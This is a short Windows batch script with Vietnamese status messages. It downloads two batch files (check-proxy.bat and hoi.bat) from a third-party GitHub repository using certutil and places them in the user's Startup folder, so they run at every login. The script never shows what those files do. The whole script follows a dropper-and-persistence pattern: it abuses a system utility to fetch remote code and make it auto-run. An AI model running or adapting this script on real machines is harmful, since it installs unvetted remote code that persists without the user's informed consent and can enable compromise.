@echo off
set "batFileUrl1=https://github.com/nobita2906/file_vm/raw/main/check-proxy.bat"
set "batFileUrl2=https://raw.githubusercontent.com/nobita2906/file_vm/main/hoi.bat"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "batFilePath1=%startupFolder%\check-proxy.bat"
set "batFilePath2=%startupFolder%\hoi.bat"

echo Tải check-proxy.bat...
certutil -urlcache -split -f "%batFileUrl1%" "%batFilePath1%"
if %ERRORLEVEL% neq 0 (
    echo Lỗi khi tải check-proxy.bat
) else (
    echo Đã tải thành công check-proxy.bat
)

echo Tải hoi.bat...
certutil -urlcache -split -f "%batFileUrl2%" "%batFilePath2%"
if %ERRORLEVEL% neq 0 (
    echo Lỗi khi tải hoi.bat
) else (
    echo Đã tải thành công hoi.bat
)
